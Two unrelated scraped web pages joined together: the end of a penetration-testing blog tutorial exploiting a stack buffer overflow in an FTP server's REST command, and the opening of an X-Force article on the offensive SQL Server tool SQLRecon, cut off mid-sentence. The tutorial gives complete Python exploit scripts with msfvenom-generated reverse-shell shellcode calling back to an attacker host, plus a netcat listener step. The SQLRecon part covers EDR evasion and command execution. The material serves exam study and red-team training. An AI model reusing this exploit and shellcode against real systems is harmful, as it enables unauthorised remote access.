(\n\"\\x01\\x02\\x03\\x04\\x05\\x06\\x07\\x08\\x09\\x0a\\x0b\\x0c\\x0d\\x0e\\x0f\\x10\"\n\"\\x11\\x12\\x13\\x14\\x15\\x16\\x17\\x18\\x19\\x1a\\x1b\\x1c\\x1d\\x1e\\x1f\\x20\"\n\"\\x21\\x22\\x23\\x24\\x25\\x26\\x27\\x28\\x29\\x2a\\x2b\\x2c\\x2d\\x2e\\x2f\\x30\"\n\"\\x31\\x32\\x33\\x34\\x35\\x36\\x37\\x38\\x39\\x3a\\x3b\\x3c\\x3d\\x3e\\x3f\\x40\"\n\"\\x41\\x42\\x43\\x44\\x45\\x46\\x47\\x48\\x49\\x4a\\x4b\\x4c\\x4d\\x4e\\x4f\\x50\"\n\"\\x51\\x52\\x53\\x54\\x55\\x56\\x57\\x58\\x59\\x5a\\x5b\\x5c\\x5d\\x5e\\x5f\\x60\"\n\"\\x61\\x62\\x63\\x64\\x65\\x66\\x67\\x68\\x69\\x6a\\x6b\\x6c\\x6d\\x6e\\x6f\\x70\"\n\"\\x71\\x72\\x73\\x74\\x75\\x76\\x77\\x78\\x79\\x7a\\x7b\\x7c\\x7d\\x7e\\x7f\\x80\"\n\"\\x81\\x82\\x83\\x84\\x85\\x86\\x87\\x88\\x89\\x8a\\x8b\\x8c\\x8d\\x8e\\x8f\\x90\"\n\"\\x91\\x92\\x93\\x94\\x95\\x96\\x97\\x98\\x99\\x9a\\x9b\\x9c\\x9d\\x9e\\x9f\\xa0\"\n\"\\xa1\\xa2\\xa3\\xa4\\xa5\\xa6\\xa7\\xa8\\xa9\\xaa\\xab\\xac\\xad\\xae\\xaf\\xb0\"\n\"\\xb1\\xb2\\xb3\\xb4\\xb5\\xb6\\xb7\\xb8\\xb9\\xba\\xbb\\xbc\\xbd\\xbe\\xbf\\xc0\"\n\"\\xc1\\xc2\\xc3\\xc4\\xc5\\xc6\\xc7\\xc8\\xc9\\xca\\xcb\\xcc\\xcd\\xce\\xcf\\xd0\"\n\"\\xd1\\xd2\\xd3\\xd4\\xd5\\xd6\\xd7\\xd8\\xd9\\xda\\xdb\\xdc\\xdd\\xde\\xdf\\xe0\"\n\"\\xe1\\xe2\\xe3\\xe4\\xe5\\xe6\\xe7\\xe8\\xe9\\xea\\xeb\\xec\\xed\\xee\\xef\\xf0\"\n\"\\xf1\\xf2\\xf3\\xf4\\xf5\\xf6\\xf7\\xf8\\xf9\\xfa\\xfb\\xfc\\xfd\\xfe\\xff\" ) #adding\nall possible characters\nbuffer = offset + EIP + badchars #assembling the buffer\ns = socket(AF_INET,SOCK_STREAM)\ns.connect((\"10.0.0.101\",21)) #establishing connection\ns.recv(2000)\ns.send(\"USER test\\r\\n\") #sending username\ns.recv(2000)\ns.send(\"PASS test\\r\\n\") #sending password\ns.recv(2000)\ns.send(\"REST \"+ buffer +\"\\r\\n\") #sending rest and buffer\ns.close()\ns = socket(AF_INET,SOCK_STREAM)\ns.connect((\"10.0.0.101\",21)) #an additional connection is needed for the\ncrash to occur\nsleep(1) #waiting one second\ns.close() #closing the connection\nprint \"\\n[+] Sending buffer of \" + str(len(buffer)) + \" bytes...\"\nprint \"\\n[+] Sending buffer: \" + buffer\nprint \"\\n[+] Done!\"\nexcept: #if a connection can't be made, print an error and exit cleanly\nprint \"[*]Error in connection with server\"\nsys.exit()\nRestarting the application, re-attaching Immunity Debugger and running\nthe script:\nRight-clicking on the ESP value and selecting \u201cFollow in Dump\u201d to\nfollow ESP in the application dump and see if all the characters sent\nmade it there:\nIt looks like the characters stop displaying properly after x09, so\nthis indicates that the next character (x0A) is a bad character\nAfter removing x0A from the badchars variable and following the same\nprocess again, this time the characters stopped after x0C , so x0D is\nalso bad\nThis time, all of the characters made it into the ESP dump, starting\nfrom x01 all the way to xFF, so the only bad characters are x00, x0A\nand x0D.\nFinding a JMP ESP Return Address\nNow that we can control EIP and found a suitable location for our\nshellcode (ESP), we need to redirect the execution flow of the program\nto ESP, so that it will execute the shellcode. In order to do this, we\nneed to find a valid JMP ESP instruction address, which would allow us\nto \u201cjump\u201d to ESP.\nFor the address to be valid, it must not be compiled with ASLR support\nand it cannot contain any of the bad characters found above, as the\nprogram needs to be able to interpret the address to perform the jump.\nRestarting the application, re-attaching Immunity Debugger and using\n!mona modules command to find a valid DLL\/module:\nFinding a valid opcode for the JMP ESP instruction \u2013 FFE4 is what we\nrequire:\nUsing the Mona find command to with to find valid pointers for the JMP\nESP instruction:\n!mona find -s string_to_search_for -m module_to_search_in\nIt looks like a valid pointer was found (0x7734BC0B), and it doesn\u2019t\ncontains any of the bad characters.\nThe following Mona command can also be used to find a valid pointer to\na JMP ESP instruction address:\n!mona jmp -r esp -cpb bad_characters\nCopying the address and searching for it in the application\ninstructions using the \u201cfollow expression\u201d Immunity feature to ensure\nit is valid:\nIt looks like it does correspond to a valid JMP ESP instruction\naddress:\nChanging the script replacing the \u201cB\u201d characters used for the EIP\nregister with the newly found JMP ESP instruction address.\nThe EIP return address has to be entered the other way around as\nexplained in the memory section, since little endian stores bytes in\nmemory in reverse order.\nimport errno\nfrom os import strerror\nfrom socket import *\nimport sys\nfrom time import sleep\nfrom struct import pack\ntry:\nprint \"\\n[+] Sending evil buffer...\"\noffset = \"A\" * 246 #defining the offset value\nEIP = \"\\x0B\\xBC\\x34\\x77\" #EIP placeholder\nshellcode = \"C\" * (800 - (len(offset) -len(EIP))) #Shellcode placeholder\nusing about 550 Cs\nbuffer = offset + EIP + shellcode #assembling the buffer\ns = socket(AF_INET,SOCK_STREAM)\ns.connect((\"10.0.0.101\",21)) #establishing connection\ns.recv(2000)\ns.send(\"USER test\\r\\n\") #sending username\ns.recv(2000)\ns.send(\"PASS test\\r\\n\") #sending password\ns.recv(2000)\ns.send(\"REST \"+ buffer +\"\\r\\n\") #sending rest and buffer\ns.close()\ns = socket(AF_INET,SOCK_STREAM)\ns.connect((\"10.0.0.101\",21)) #an additional connection is needed for the\ncrash to occur\nsleep(1) #waiting one second\ns.close() #closing the connection\nprint \"\\n[+] Sending buffer of \" + str(len(buffer)) + \" bytes...\"\nprint \"\\n[+] Sending buffer: \" + buffer\nprint \"\\n[+] Done!\"\nexcept: #if a connection can't be made, print an error and exit cleanly\nprint \"[*]Error in connection with server\"\nsys.exit()\nBreakpoints are used to stop the application execution when a certain\nmemory location is reached and they can be used to ensure the JMP ESP\ninstruction is working correctly.\nRestarting the application, re-attaching Immunity Debugger and adding a\nbreakpoint on the JMP ESP instruction address by hitting F2, then\nstarting the program execution:\nA breakpoint can also be added by right-clicking the memory location in\nthe top-left pane, and selecting the Breakpoint \u2192 Memory, on access\noption:\nExecuting the script again:\nWhen the application reaches the JMP ESP instruction, which is where\nthe breakpoint was added, the program execution stops as instructed:\nWhen single-stepping into the application execution using F7, this\ntakes us to the C characters which are the placeholder for our\nshellcode.\nSingle-stepping can also be done through the Debug \u2192 Step into option:\nGenerating and Adding Shellcode\nAt this point we can completely control the execution flow of the\nprogram, so all that is left to do is add our shellcode to the exploit\nto trigger a reverse shell.\nThe shellcode can be generated using MSFvenom with the following flags:\n* -p to specify the payload type, in this case the Windows reverse\nTCP shell\n* LHOST to specify the local host IP address to connect to\n* LPORT to specify the local port to connect to\n* -f to specify the format, in this case Python\n* -b to specify the bad characters, in this case \\x00, \\x0A and \\x0D\n* -e to specify the encoder, in this case shikata_ga_nai\n* -v to specify the name of the variable used for the shellcode, in\nthis case simply \u201cshellcode\u201d\nBecause the shellcode is generated using an encoder (which purpose is\nbasic antivirus evasion), the program first needs to decode the\nshellcode before it can be run. This process will corrupt the next few\nbytes of information contained in the shellcode, and therefore a few\nNOP Slides are required to give the decoder enough time to decode it\nbefore it is executed by the program.\nNOP Slides (No Operation Instructions) have a value of 0x90 and are\nused to pass execution to the next instruction i.e. let CPU \u201cslide\u201d\nthrough them until the shellcode is reached.\nAdding the shellcode to the script, along with 20 NOP slides at the\nbeginning of it to avoid errors during the decoding phase:\nimport errno\nfrom os import strerror\nfrom socket import *\nimport sys\nfrom time import sleep\nfrom struct import pack\ntry:\nprint \"\\n[+] Sending evil buffer...\"\noffset = \"A\" * 246 #defining the offset value\nEIP = \"\\x0B\\xBC\\x34\\x77\" #EIP Return Address\n#msfvenom -p windows\/shell_reverse_tcp LHOST=10.0.0.110 LPORT=443 -f py -b \"\\x00\n\\x0a\\x0d\" -e x86\/shikata_ga_nai -v shellcode\nshellcode =  b\"\"\nshellcode += b\"\\xda\\xda\\xd9\\x74\\x24\\xf4\\xb8\\x6c\\x6d\\x17\\xbc\"\nshellcode += b\"\\x5b\\x2b\\xc9\\xb1\\x52\\x31\\x43\\x17\\x83\\xeb\\xfc\"\nshellcode += b\"\\x03\\x2f\\x7e\\xf5\\x49\\x53\\x68\\x7b\\xb1\\xab\\x69\"\nshellcode += b\"\\x1c\\x3b\\x4e\\x58\\x1c\\x5f\\x1b\\xcb\\xac\\x2b\\x49\"\nshellcode += b\"\\xe0\\x47\\x79\\x79\\x73\\x25\\x56\\x8e\\x34\\x80\\x80\"\nshellcode += b\"\\xa1\\xc5\\xb9\\xf1\\xa0\\x45\\xc0\\x25\\x02\\x77\\x0b\"\nshellcode += b\"\\x38\\x43\\xb0\\x76\\xb1\\x11\\x69\\xfc\\x64\\x85\\x1e\"\nshellcode += b\"\\x48\\xb5\\x2e\\x6c\\x5c\\xbd\\xd3\\x25\\x5f\\xec\\x42\"\nshellcode += b\"\\x3d\\x06\\x2e\\x65\\x92\\x32\\x67\\x7d\\xf7\\x7f\\x31\"\nshellcode += b\"\\xf6\\xc3\\xf4\\xc0\\xde\\x1d\\xf4\\x6f\\x1f\\x92\\x07\"\nshellcode += b\"\\x71\\x58\\x15\\xf8\\x04\\x90\\x65\\x85\\x1e\\x67\\x17\"\nshellcode += b\"\\x51\\xaa\\x73\\xbf\\x12\\x0c\\x5f\\x41\\xf6\\xcb\\x14\"\nshellcode += b\"\\x4d\\xb3\\x98\\x72\\x52\\x42\\x4c\\x09\\x6e\\xcf\\x73\"\nshellcode += b\"\\xdd\\xe6\\x8b\\x57\\xf9\\xa3\\x48\\xf9\\x58\\x0e\\x3e\"\nshellcode += b\"\\x06\\xba\\xf1\\x9f\\xa2\\xb1\\x1c\\xcb\\xde\\x98\\x48\"\nshellcode += b\"\\x38\\xd3\\x22\\x89\\x56\\x64\\x51\\xbb\\xf9\\xde\\xfd\"\nshellcode += b\"\\xf7\\x72\\xf9\\xfa\\xf8\\xa8\\xbd\\x94\\x06\\x53\\xbe\"\nshellcode += b\"\\xbd\\xcc\\x07\\xee\\xd5\\xe5\\x27\\x65\\x25\\x09\\xf2\"\nshellcode += b\"\\x2a\\x75\\xa5\\xad\\x8a\\x25\\x05\\x1e\\x63\\x2f\\x8a\"\nshellcode += b\"\\x41\\x93\\x50\\x40\\xea\\x3e\\xab\\x03\\x1f\\xbf\\xb3\"\nshellcode += b\"\\xbd\\x77\\xbd\\xb3\\x40\\x33\\x48\\x55\\x28\\x53\\x1d\"\nshellcode += b\"\\xce\\xc5\\xca\\x04\\x84\\x74\\x12\\x93\\xe1\\xb7\\x98\"\nshellcode += b\"\\x10\\x16\\x79\\x69\\x5c\\x04\\xee\\x99\\x2b\\x76\\xb9\"\nshellcode += b\"\\xa6\\x81\\x1e\\x25\\x34\\x4e\\xde\\x20\\x25\\xd9\\x89\"\nshellcode += b\"\\x65\\x9b\\x10\\x5f\\x98\\x82\\x8a\\x7d\\x61\\x52\\xf4\"\nshellcode += b\"\\xc5\\xbe\\xa7\\xfb\\xc4\\x33\\x93\\xdf\\xd6\\x8d\\x1c\"\nshellcode += b\"\\x64\\x82\\x41\\x4b\\x32\\x7c\\x24\\x25\\xf4\\xd6\\xfe\"\nshellcode += b\"\\x9a\\x5e\\xbe\\x87\\xd0\\x60\\xb8\\x87\\x3c\\x17\\x24\"\nshellcode += b\"\\x39\\xe9\\x6e\\x5b\\xf6\\x7d\\x67\\x24\\xea\\x1d\\x88\"\nshellcode += b\"\\xff\\xae\\x2e\\xc3\\x5d\\x86\\xa6\\x8a\\x34\\x9a\\xaa\"\nshellcode += b\"\\x2c\\xe3\\xd9\\xd2\\xae\\x01\\xa2\\x20\\xae\\x60\\xa7\"\nshellcode += b\"\\x6d\\x68\\x99\\xd5\\xfe\\x1d\\x9d\\x4a\\xfe\\x37\"\nnops = \"\\x90\" * 20 #NOP Slides\nbuffer = offset + EIP + nops + shellcode\ns = socket(AF_INET,SOCK_STREAM)\ns.connect((\"10.0.0.101\",21)) #establishing connection\ns.recv(2000)\ns.send(\"USER test\\r\\n\") #sending username\ns.recv(2000)\ns.send(\"PASS test\\r\\n\") #sending password\ns.recv(2000)\ns.send(\"REST \"+ buffer +\"\\r\\n\") #sending rest and buffer\ns.close()\ns = socket(AF_INET,SOCK_STREAM)\ns.connect((\"10.0.0.101\",21)) #an additional connection is needed for the\ncrash to occur\nsleep(1) #waiting one second\ns.close() #closing the connection\nprint \"\\n[+] Sending buffer of \" + str(len(buffer)) + \" bytes...\"\nprint \"\\n[+] Sending buffer: \" + buffer\nprint \"\\n[+] Done!\"\nexcept: #if a connection can't be made, print an error and exit cleanly\nprint \"[*]Error in connection with server\"\nsys.exit()\nGaining Remote Access\nOnce the final exploit has been assembled, the next step is to set up a\nNetcat listener, which will catch our reverse shell when it is\nexecuted, using the following flags:\n* -l to listen for incoming connections\n* -v for verbose output\n* -n to skip the DNS lookup\n* -p to specify the port to listen on\nRestarting the application without the Immunity Debugger this time\nRunning the final Python exploit:\nA call back was received and a reverse shell was granted as the \u201cstef\u201d\nuser. The privileges granted by the exploit will always match the ones\nof the user owning the process.\nOther Buffer Overflow Examples\nStack buffer overflow is quite a difficult attack to learn, especially\nwhen not proficient with assembly programming. In case this post by\nitself wasn\u2019t enough for you to comprehend the steps required to\nexploit a stack buffer overflow vulnerability, below are some more\nexploitation walkthrough examples that I published in the blog:\n* [65]Stack Buffer Overflow \u2013 Exploiting SLMail 5.5\n* [66]Vulnhub \u2013 Brainpan 1 Walkthrough\n* [67]Stack Buffer Overflow \u2013 Vulnserver Guide\n* [68]Stack Buffer Overflow \u2013 dostackbufferoverflowgood Guide\nThese are all performed against executables that are available online\nand have helped me greatly when preparing for the OSCP certification\nexam.\nConclusion\nStack Buffer Overflow is one of the oldest and most common\nvulnerabilities exploited by attackers to gain unauthorized access to\nvulnerable systems.\nControl-flow integrity schemes should be implemented to prevent\nredirection to arbitrary code, prevent execution of malicious code from\nthe stack and randomize the memory space layout to make it harder for\nattackers to find valid valid instruction addresses to jump to certain\nsectors of the memory that may contain executable malicious code.\nSources & Useful Links\n* [69]https:\/\/www.exploit-db.com\/exploits\/17548\n* [70]https:\/\/wiki.skullsecurity.org\/index.php?title=The_Stack\n* [71]https:\/\/wiki.skullsecurity.org\/index.php?title=Fundamentals\n* [72]https:\/\/wiki.skullsecurity.org\/Registers\n* [73]https:\/\/wiki.skullsecurity.org\/index.php?title=Simple_Instructi\nons\n* [74]https:\/\/www.corelan.be\/index.php\/2009\/07\/19\/exploit-writing-tut\norial-part-1-stack-based-overflows\/\n* [75]https:\/\/www.corelan.be\/index.php\/2009\/07\/23\/writing-buffer-over\nflow-exploits-a-quick-and-basic-tutorial-part-2\/\n* [76]https:\/\/www.corelan.be\/index.php\/2009\/07\/25\/writing-buffer-over\nflow-exploits-a-quick-and-basic-tutorial-part-3-seh\/\n* [77]https:\/\/www.vortex.id.au\/2017\/05\/pwkoscp-stack-buffer-overflow-\npractice\/\n[78]Buffer Overflow[79]debugging[80]guide[81]Hacking[82]immunity\ndebugger[83]Linux[84]OSCP[85]Penetration Testing[86]Pentesting[87]stack\nbuffer overflow[88]Windows\nShare\n[89]Previous post\n[90]Next post\nYou may also like\n[91]Certified Azure Red Team Professional (CARTP) Review Certified\nAzure Red Team Professional (CARTP) Review [92]Certified Azure Red Team\nProfessional (CARTP) Review\nDecember 23, 2023\n[93]A Complete Guide to Hacking GraphQL A Complete Guide to Hacking\nGraphQL [94]A Complete Guide to Hacking GraphQL\nSeptember 17, 2023\n[95]Offensive Security Experienced Penetration Tester (OSEP) Review\nOffensive Security Experienced Penetration Tester (OSEP) Review\n[96]Offensive Security Experienced Penetration Tester (OSEP) Review\nJanuary 24, 2023\n12 comments\nComments are closed.\n*\neva\n[97]March 7, 2022 at 10:51 am\nThis is what i was looking for. Your work is appreciated XOXO\n+\nStefano Lanaro\n[98]April 10, 2022 at 8:18 am\nGlad it was helpful!\n*\nbits4ilor\n[99]December 9, 2021 at 4:31 pm\nVery good article, thanks for that! Question: wouldn\u2019t be okay to\nadd EXITFUNC=thread into a shellcode in order to not crash teh app\nafter runnig the exploit?\n+\nStefano Lanaro\n[100]January 22, 2022 at 6:06 am\nI\u2019m glad it was useful! Yes, that would be perfectly fine,\nespecially in situations where causing the application to\ncrash isn\u2019t ideal.\n*\nAnonymous\n[101]October 23, 2021 at 9:14 am\nYou went through and determined the ESP had enough space for the\nprogram. How does this relate to the ESP space for the dll?\nWouldn\u2019t this be different?\n+\nStefano Lanaro\n[102]October 28, 2021 at 10:42 pm\nESP is where the shellcode will be placed, whereas the DLL is\nused as a JUMP point to ESP and it replaces EIP, which is the\nfirst instruction.\n*\nMarkus\n[103]October 17, 2021 at 7:46 pm\nThanks! One thing I don\u2019t get, why do you choose ntdll.dll when\nASLR protects it?\n+\nStefano Lanaro\n[104]October 18, 2021 at 11:34 am\nHi Markus,\nThat\u2019s a great question! As far as I know, ASLR is meant to\nprotect from buffer overflow attacks by increasing the space\nwhere files, DLLs and other binary are loaded into memory and\nrandomizing where they are loaded to prevent attackers from\nbeing able to inject malicious code.\nWhether this is a good approach entirely depends on the number\nof bits used in the randomization process. 32-bit applications\nwill be a lot less secure even though ASLR is implemented. In\nthis specific case, even though ASLR was being used, which\nwould normally randomize the memory location of modules and\nDLLs, the current location can still be found and used as a\nJMP ESP address while the application is running, but it would\nchange the next time the application is restarted, making it\nmuch more difficult to perform this type of attack without\nbeing able to debug the application first, and therefore\nhaving to brute force all of the possible 256 memory\nlocations. The author of the exploit used a hard-coded address\nfor the KERNEL32 DLL in the exploit, which makes me think this\nparticular one is not well protected with ASLR (or at least in\nWindows XP SP3 which is the version mentioned in Exploit DB)\nHope this was helpful!\n*\n[105]Anonymous\n[106]August 23, 2021 at 4:45 am\nAwesome website man, I wish I can make something similar with some\ncontent like this lmao.\n+\nStefano Lanaro\n[107]August 23, 2021 at 6:34 am\nI\u2019m glad it was useful to you \ud83d\ude42\n*\nJay\n[108]August 22, 2021 at 11:12 am\nHi,\nDid I understood it correctly that we are overflowing buffer (to\nrewrite EIP) but our shellcode is not going into buffer it goes\ninstead into register ESP if there is enough space for it \u2013 if not\nwe gorce ESP to jump to another register that can store our\nshellcode?\n+\nStefano Lanaro\n[109]August 23, 2021 at 6:36 am\nThat\u2019s exactly right! The only reason we overwrite EIP is to\ninstruct it to redirect execution to another register\ncontaining the malicious code. This is normally ESP, but when\nit doesn\u2019t have enough space we simply use it to perform an\nadditional jump to an appropriate register.\n* [110]Home\n* [111]About\nPowered by [112]Piemont - Premium Wordpress Theme\n\u00d7\n* Navigation\n+ [113]Home\n+ [114]CTF Walkthroughs\no [115]Hack The Box\no [116]TryHackMe\no [117]VulnHub\n+ [118]Guides\no [119]Enumeration\no [120]Privilege Escalation\n# [121]Linux\n# [122]Windows\no [123]Web\no [124]Buffer Overflow\n# [125]Stack Buffer Overflow\n+ [126]Reviews\no [127]Certifications\no [128]Training Labs\no [129]Learning Material\n+ [130]Resources\no [131]Cheat Sheets\no [132]Checklists\n+ [133]About\n* About StefLan Security\nI am a penetration tester and cyber security \/ Linux enthusiast.\nThrough this blog, I would like to share my passion for penetration\ntesting, hoping that this might be of help for other students and\nprofessionals out there. I will be more than glad to exchange ideas\nwith other fellow pentesters and enthusiasts.\n* Recent Posts\n+ [134]Certified Azure Red Team Professional (CARTP) Review\nDecember 23, 2023\n+ [135]A Complete Guide to Hacking GraphQL September 17, 2023\n+ [136]Offensive Security Experienced Penetration Tester (OSEP)\nReview January 24, 2023\n+ [137]TryHackMe \u2013 DogCat Walkthrough February 26, 2022\n+ [138]TryHackMe \u2013 The Marketplace Walkthrough January 27, 2022"}
{"text":"#[1]alternate [2]alternate [3]alternate\nSecurity Intelligence\n[4]News [5]Series [6]Topics [7]X-Force [8]Podcast (BUTTON)\n(BUTTON) News (BUTTON) Series (BUTTON) Topics (BUTTON) Threat Research\n(BUTTON) Podcast (BUTTON)\n____________________ (submit) Search (reset)\n{{#articles}}\n{{title}}\n{{\/articles}} [9]View All News\n{{#articles}}\n{{title}}\n{{\/articles}} [10]View All Series\n[11]Application Security [12]Artificial Intelligence [13]CISO [14]Cloud\nSecurity [15]Data Protection [16]Endpoint\n[17]Fraud Protection [18]Identity & Access [19]Incident Response\n[20]Mainframe [21]Network [22]Risk Management\n[23]Intelligence & Analytics [24]Security Services [25]Threat Hunting\n[26]Zero Trust [27]Infographic: Zero trust policy [28]Timeline: Local\nGovernment Cyberattacks\nIndustries [29]Banking & Finance [30]Energy & Utility [31]Government\n[32]Healthcare\n[33]View All Topics\n{{#articles}}\n{{title}}\n{{\/articles}} [34]View More From X-Force\n{{#articles}}\n{{title}}\n{{\/articles}} [35]View All Episodes\n(BUTTON)\n[36]News [37]Series\nTopics\n[38]All Categories [39]Application Security [40]Identity & Access\n[41]Artificial Intelligence [42]Incident Response [43]CISO\n[44]Mainframe [45]Cloud Security [46]Mobile Security [47]Data\nProtection [48]Network [49]Endpoint [50]Risk Management [51]Fraud\nProtection [52]Threat Hunting [53]Security Services [54]Security\nIntelligence & Analytics\nIndustries [55]Banking & Finance [56]Energy & Utility [57]Government\n[58]Healthcare\n[59]X-Force [60]Podcast\n(BUTTON)\nDatabases beware: Abusing Microsoft SQL Server with SQLRecon\n[61]Light [62]Dark\n__________________________________________________________________\nAugust 7, 2023 By [63]Sanjiv Kawa 20 min read\n__________________________________________________________________\n[64]Adversary Services\n[65]Network\n[66]X-Force\n__________________________________________________________________\nOver the course of my career, I\u2019ve had the privileged opportunity to\npeek behind the veil of some of the largest organizations in the world.\nIn my experience, most industry verticals rely on enterprise Windows\nnetworks. In fact, I can count on one hand the number of times I have\nseen a decentralized zero-trust network, enterprise Linux, macOS\nnetwork, or Active Directory alternative (FreeIPA).\nAs I navigate my way through these large and often complex enterprise\nnetworks, it is common to discover Microsoft SQL Servers, which have\ntypically been deployed to support a business function. For readers who\nare unfamiliar with SQL Server, the long and short is that it\u2019s a\nrelational database software usually installed on top of a Windows\nserver. The primary purpose of SQL Server is to store and provide data\nto applications or users.\nThis blog post will review the attack surface that is presented by SQL\nServer, and how to abuse misconfigurations and vulnerabilities using\nX-Force Red\u2019s tool [67]SQLRecon. In addition, defensive considerations\nwill be outlined where applicable.\nMicrosoft SQL Server\nThe vulnerabilities and misconfigurations in SQL Server have been well\ndocumented. While these weaknesses have seemingly always existed,\nsomehow hardening SQL Server continues to be often overlooked by\ndefensive teams. I am mostly referring to hardening the underlying\nconfiguration and preventing trivial access to the service.\nOne plausible justification for this oversight is that there are bigger\nrisks an organization needs to prioritize and address. As a result,\nhardening SQL Server falls to the wayside, as tinkering with production\ndatabase configurations may result in availability issues, which could\nmanifest into operational issues and ultimately impact business\nproductivity.\nCommon vulnerabilities and misconfigurations\nOne of the most common misconfigurations I continue to see in\nenterprise networks is the ability for any authenticated domain object\nto connect to the SQL service as a low privilege account. This only\nrequires a valid domain context. In other words, a valid token for a\ndomain user or domain computer account.\nTo illustrate an example, if the workstation of a regular business user\nis compromised and a network route exists to a misconfigured SQL\nServer, it is possible for an adversary to:\n* Execute limited SQL commands on the remote SQL Server.\n* Determine the privileges they have, which could provide escalation\nopportunities via impersonation-style attacks.\n* Instruct SQL Server to provide authentication materials via a\nsolicited request to a Universal Naming Convention (UNC) path,\nwhich can result in obtaining hashed credentials, which in turn can\nbe cracked or passed forward to perform relaying style attacks.\n* Piggyback off the rights assigned to a SQL Server that is linked to\nother SQL Servers, which can result in privilege escalation.\nThese are just some examples of what an adversary can achieve when\nassessing a misconfigured SQL Server within a domain context. The\nattack surface presented by SQL Server will always depend on the\nenvironment and configuration you are facing.\nWhy focus on Microsoft SQL Server attacks now?\nIn recent times, red team operators have been nothing short of blessed\nby the variety of Active Directory abuses that can be leveraged to\nelevate privileges in enterprise Microsoft networks. However, as\ndefensive teams start to get a handle on mitigating these weaknesses,\nnaturally the avenues to escalate privileges through abusing Active\nDirectory tend to dry up.\nStill, we soldier on and make our way down the proverbial list of\nattacks, optimistically seeking escalation paths that will aid us in\nacting on our objectives. I\u2019m somewhat reluctant to admit that for a\nlong time, attacking SQL Server was quite far down the list for me.\nInstead, I opted to prioritize things like shared storage spaces,\ninternal web applications, DevOps tooling, or cloud infrastructure. You\ncan probably see where I am going with this \u2026\nAt some point in 2022, I was on an engagement and had reached a\nstalling point after exhausting all the preferred escalation paths.\nThis was largely due to an exceptionally well-hardened environment. At\nleast, that was what I thought before I discovered a large SQL Server\nfarm, where there just had to be a misconfiguration or vulnerability.\nUnbeknownst to me at the time, and only after writing this blog post, I\ndiscovered that [68]Kaspersky found that reoccurring attacks using SQL\nServer had risen by 56% in 2022. That is a staggering amount.\nAttacking Microsoft SQL Server\nAs a red team operator, I often interact with systems I have\ncompromised in our clients\u2019 networks using a command and control (C2)\nframework. The clients we are fortunate enough to work with usually\nhave mature cyber-security programs, capable defensive teams, and\nmodern security controls, such as endpoint detection and response (EDR)\nsolutions.\nThere have been several tools developed over the years to attack SQL\nServer. The one that I always ended up reaching for during my\npen-testing days was [69]PowerUpSQL. This is a project that was created\nby Scott Sutherland ([70]@_nullbind), developed largely in PowerShell.\nEDR solutions can be a formidable opponent to go up against as they do\na fantastic job detecting malicious open-source tooling designed for\noffensive security, especially those that rely on PowerShell. That\u2019s\nnot to slight PowerShell post-exploitation tooling, they serve a\npurpose, just not for the problem I was facing in the environment I was\nin.\nPowerShell is good, but C# is better\nThe problem I was facing on my engagement was that I needed to find a\nway to connect to Microsoft SQL Servers and begin interrogating them to\ndetermine if there were any misconfigurations or vulnerabilities.\nHowever, using any of the existing SQL Server post-exploitation tools,\nwhich rely on PowerShell, would have been a sure-fire way of getting\ncaught by the defensive team. This is due to a variety of reasons,\nwhich I won\u2019t pour over in detail, but PowerShell is not an ideal\nharness to sling your post-exploitation attacks due to security\nfeatures such as [71]AMSI, [72]constrained language mode, and various\nstyles of [73]logging. This is only further compounded when an EDR\nsolution, and other logging and monitoring controls are in place.\nAs an alternative, red team operators often choose C# as a language to\ndevelop post-exploitation tooling with, as it provides an easy way to\ninterface with the .NET framework along with Windows APIs.\nBy no means am I a C# or .NET developer, but I know just about enough\nto write tools that solve a problem I am facing. Queue SQLRecon, a C#\nSQL toolkit designed for offensive reconnaissance and\npost-exploitation.\nSQLRecon\nSQLRecon helps address the post-exploitation tooling gap by modernizing\nthe approach red team operators can take when attacking SQL Servers.\nThe tool was designed to be modular, allowing for ease of\nextensibility. SQLRecon is compatible stand-alone or within a diverse\nset of C2 frameworks. When using the latter, SQLRecon can be executed\neither [74]in-process or through traditional [75]fork and run.\nSQLRecon has over 80 modules to choose from. Listed below is a\nhigh-level overview of some of the features provided by SQLRecon:\nAuthentication Providers\n* Local SQL database account\n* Windows domain authentication based on current token\n* Windows domain authentication with user supplied credentials\n* Azure domain authentication\n* Azure local authentication\nEnumeration Modules\n* Locate SQL Servers associated with a Service Principal Name (SPN)\n* Obtain information about the SQL service\n* Determine privileges within SQL Server\n* List databases, tables, columns, and users\n* Search databases for content\n* Execute arbitrary queries\n* Enumerate users which can be impersonated\n* Identify linked SQL Servers\nCommand Execution, Lateral Movement and Privilege Escalation\n* xp_cmdshell\n* OLE Automation Procedures\n* Load and execute custom .NET CLR assemblies\n* SQL Agent Jobs\n* ADSI credential gathering\nOperational Security\n* Continuous authentication validation\n* Extensive command line logging\n* Execution guardrails based on whether SQL Server options are\nenabled or disabled\n* Argument error handling\n* Randomized alphanumeric SQL content creation where applicable\n* Automatic clean-up of data created in SQL Server for command\nexecution purposes\nOther\n* Ability to switch database contexts\n* Connect to SQL Servers listening on non-standard TCP ports\n* Support for impersonation-style attacks\n* Ability to enumerate and attack linked SQL Servers\n* Support for a variety of Microsoft System Center Configuration\nManager (SCCM) and Microsoft Endpoint Configuration Manager (ECM)\nSQL database attacks\n* All SQL queries use the [76]System.Data.SqlClient namespace,\ndeveloped by Microsoft\nFor detailed usage information on each technique, please refer to the\n[77]wiki.\nUsing SQLRecon\nTo set the stage for the upcoming demonstrations, I will be operating\noff a compromised Windows 10 workstation that belongs to Jeff Smith\n(JSmith) in the kawalabs.local enterprise network.\nJeff\u2019s workstation has a network route to three SQL Servers, each of\nwhich are running different versions; 2016, 2019 and 2022.\nA [78]SQL link has been configured between SQL01 and SQL02, and another\nSQL link has been configured between SQL02 and SQL03. For readers who\nare not familiar with linked SQL Servers, this effectively allows one\nSQL instance to execute SQL statements on another SQL instance. For\nexample, SQL01 can execute SQL statements on SQL02, and SQL02 can\nexecute statements on SQL03, but SQL01 cannot execute statements on\nSQL03 and vice versa. It is common to see linked SQL Servers in real\nenterprise networks.\nIn addition, an [79]Active Directory Services (ADSI) link exists\nbetween SQL03 and the primary domain controller in the kawalabs.local\ndomain, DC01. ADSI links provide SQL Server with a way to interact with\nActive Directory objects.\nLastly, the kawalabs.local domain has been connected to an Azure Active\nDirectory domain, kawalabs.onmicrosoft.com using [80]Azure AD Connect.\nThis allows on-premise Active Directory users in the kawalabs.local to\naccess resources in the Azure cloud. The  kawalabs.onmicrosoft.com\nAzure AD tenancy contains a SQL Server which stores payment data,\nECOM01.\nFigure 1: Network configuration\nFurthermore, I will be leveraging [81]Cobalt Strike, which is a popular\ncommand-and-control framework, to perform 